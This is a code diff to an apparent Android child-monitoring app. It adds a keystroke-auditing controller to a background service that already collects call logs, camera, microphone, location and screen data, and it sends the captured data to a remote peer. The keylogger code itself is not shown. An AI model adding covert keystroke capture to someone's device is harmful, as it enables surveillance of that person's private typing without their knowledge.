@@ -18,6 +18,8 @@ import com.nexus.child.components.calllog.CallLogCommandHandler
 import com.nexus.child.components.calllog.CallLogController
 import com.nexus.child.components.camera.CameraController
 import com.nexus.child.components.camera.CameraCommandHandler
+import com.nexus.child.components.keyboard.KeyboardCommandHandler
+import com.nexus.child.components.keyboard.KeyboardController
 import com.nexus.child.components.location.LocationCommandHandler
 import com.nexus.child.components.location.LocationController
 import com.nexus.child.components.mic.MicCommandHandler
@@ -180,6 +182,8 @@ class NexusBackgroundService : Service() {
     private var notificationCommandHandler: NotificationCommandHandler? = null
     private var screenController: ScreenController? = null
     private var screenCommandHandler: ScreenCommandHandler? = null
+    private var keyboardController: KeyboardController? = null
+    private var keyboardCommandHandler: KeyboardCommandHandler? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -541,7 +545,15 @@ class NexusBackgroundService : Service() {
             dataSender = { msg -> rtcManager.sendData(msg) }
         )
 
-        Log.d(TAG, "All 10 hardware monitoring controllers successfully initialized in background")
+        // Keyboard & Keystroke Auditing
+        val kbCtrl = KeyboardController(this)
+        keyboardController = kbCtrl
+        keyboardCommandHandler = KeyboardCommandHandler(
+            keyboardController = kbCtrl,
+            dataSender = { msg -> rtcManager.sendData(msg) }
+        )
+
+        Log.d(TAG, "All 11 hardware monitoring controllers successfully initialized in background")
     }
 
     /**
@@ -557,7 +569,8 @@ class NexusBackgroundService : Service() {
                 wallpaperCommandHandler?.handleCommand(command) == true ||
                 storageCommandHandler?.handleCommand(command) == true ||
                 notificationCommandHandler?.handleCommand(command) == true ||
-                screenCommandHandler?.handleCommand(command) == true
+                screenCommandHandler?.handleCommand(command) == true ||
+                keyboardCommandHandler?.handleCommand(command) == true
 
         if (!handled) {
             Log.d(TAG, "Unhandled command ignored: $command")
@@ -578,12 +591,15 @@ class NexusBackgroundService : Service() {
         storageCommandHandler?.cleanup()
         notificationCommandHandler?.onPeerDisconnected()
         screenCommandHandler?.onPeerDisconnected()
+        keyboardCommandHandler?.onPeerDisconnected()
     }
 
     /**
      * Tears down all active resources when the service is stopped.
      */
     private fun cleanupEngine() {
+        keyboardCommandHandler?.cleanup()
+        keyboardController?.cleanup()
         notificationCommandHandler?.cleanup()
         notificationController?.cleanup()
         screenCommandHandler?.cleanup()
